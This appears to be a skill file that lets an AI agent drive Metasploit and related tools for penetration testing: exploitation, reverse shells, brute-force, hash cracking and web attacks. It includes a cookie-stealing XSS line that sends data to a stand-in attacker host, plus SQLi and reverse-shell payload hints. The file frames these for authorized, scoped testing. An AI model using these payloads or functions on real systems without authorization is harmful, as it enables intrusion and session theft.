---
name: metasploit
description: Use this skill when performing exploitation, meterpreter sessions, password cracking, web app attacks, or post-exploitation via Metasploit
---

# Metasploit Skill Guide

## Overview
FRIDAY integrates with Metasploit via `msfrpc` (remote procedure call) to automate penetration testing tasks: enumeration, exploitation, meterpreter sessions, password cracking, and web application attacks (SQLi, XSS, LFI, RFI, CMDi, SSRF, XXE).

## Triggers
- "exploit", "penetration test", "pentest"
- "metasploit", "msf", "meterpreter"
- "crack password", "brute force", "hydra"
- "SQL injection", "SQLi", "XSS", "LFI", "RFI"
- "command injection", "CMDi", "SSRF", "XXE"
- "SMB enumeration", "FTP brute", "SSH crack"
- "shell", "reverse shell", "bind shell"

## Requirements
- `msfrpcd` running on localhost:55553 (or configured host:port)
- Password authentication configured (default: `msf`/`msf`)
- Python `msfrpc` library installed
- Local `hydra` binary for brute-force (optional fallback)

## Connection
```python
from metasploit.msfrpc import MsfRpcClient
client = MsfRpcClient('msf', port=55553, ssl=False)
```

## Tool Functions

### Metasploit Core
| Function | Purpose |
|----------|---------|
| `metasploit_check_connection()` | Test connection to msfrpcd |
| `metasploit_list_exploits(search)` | Search/List available exploits |
| `metasploit_run_exploit(exploit, payload, target, options)` | Execute an exploit module |
| `metasploit_list_sessions()` | List active meterpreter sessions |
| `metasploit_interact_session(session_id, command)` | Run command in a session |
| `metasploit_write_payload(payload_type, lhost, lport, output)` | Generate staged payload (exe/elf/raw) |
| `metasploit_list_payloads(exploit)` | List compatible payloads for an exploit |

### Service Enumeration
| Function | Purpose |
|----------|---------|
| `smb_enum(host, share, user, pass)` | SMB share enumeration |
| `ftp_bruteforce(host, userlist, passlist)` | FTP brute-force login |
| `ssh_bruteforce(host, userlist, passlist)` | SSH brute-force login |
| `port_scan(host, port_range)` | TCP port scanning |

### Web Application Attacks
| Function | Purpose |
|----------|---------|
| `sql_injection_detect(url, params)` | SQL injection detection using time-based + error-based payloads |
| `sql_injection_exploit(url, param, db_type)` | SQLi exploitation (extract tables, columns, data) |
| `xss_detect(url, params)` | Cross-Site Scripting detection |
| `xss_exploit(url, param, payload)` | XSS exploitation with custom payload |
| `lfi_detect(url, param)` | Local File Inclusion detection |
| `lfi_exploit(url, param, file)` | LFI exploitation (file read) |
| `command_injection_detect(url, params)` | Command injection detection |
| `command_injection_exploit(url, param, cmd)` | Command injection exploitation |
| `ssrf_detect(url, param)` | Server-Side Request Forgery detection |
| `xxe_detect(url, data)` | XXE detection |
| `xxe_exploit(url, data, file)` | XXE exploitation (file read) |

### Password Cracking
| Function | Purpose |
|----------|---------|
| `crack_password(hash, hash_type, wordlist)` | Hash cracking with multiple algorithms |
| `hydra_bruteforce(target, service, userlist, passlist)` | Hydra-based brute-force |
| `wordlist_gen(base_words, rules)` | Generate custom wordlist |
| `hash_identify(hash)` | Identify hash type from format |

## Attack Workflow

### Standard Recon → Exploit → Post-Exploit
```
port_scan → smb_enum/ftp_bruteforce/ssh_bruteforce →
metasploit_run_exploit → metasploit_interact_session
```

### Web App Testing
```
sql_injection_detect → sql_injection_exploit
xss_detect → xss_exploit
lfi_detect → lfi_exploit
command_injection_detect → command_injection_exploit
ssrf_detect
xxe_detect → xxe_exploit
```

## Guidelines

### DO:
- **ALWAYS** check `metasploit_check_connection()` before running any exploit
- **ALWAYS** use detect functions before exploit functions
- **ALWAYS** use safe check options first (`check` mode in exploits)
- **ALWAYS** validate targets are in scope before attacking
- **NEVER** run exploits on production systems without explicit authorization
- **NEVER** use aggressive settings (high thread count, short timeouts)
- **NEVER** store shell access without session management
- **NEVER** skip hash identification before attempting to crack
- **PREFER** time-based SQLi for blind detection
- **PREFER** generic payloads like `generic/shell_reverse_tcp` for compatibility
- **ALWAYS** clean up meterpreter sessions after testing
- **ALWAYS** log all exploitation attempts and results

### SQLi Specific
- Always test all parameters individually
- Use `'` for single-param injection test
- Use `sleep(5)` for time-based blind detection
- Use `UNION SELECT` for data extraction
- Always URL-encode payloads

### XSS Specific
- Test both reflected and stored XSS
- Use `<script>alert(1)</script>` for basic detection
- Use `fetch('https://attacker.com/?c='+document.cookie)` for exploitation
- Always HTML-entity-encode in stored contexts

### Password Cracking
- Use wordlist-based before brute-force
- Common wordlist paths: `rockyou.txt`, `SecLists/Passwords`
- Use hashcat-compatible hash formats
- GPU-based cracking not available — use CPU

## Verification
1. Confirm msfrpcd connection before any exploit
2. Verify service is running before attempting exploitation
3. Validate SQLi results by extracting actual table names
4. Confirm session is active before post-exploitation
5. Verify LFI reads actual file contents (not error messages)
6. Check XSS fires callback before reporting success
7. Test cracked passwords against the actual service
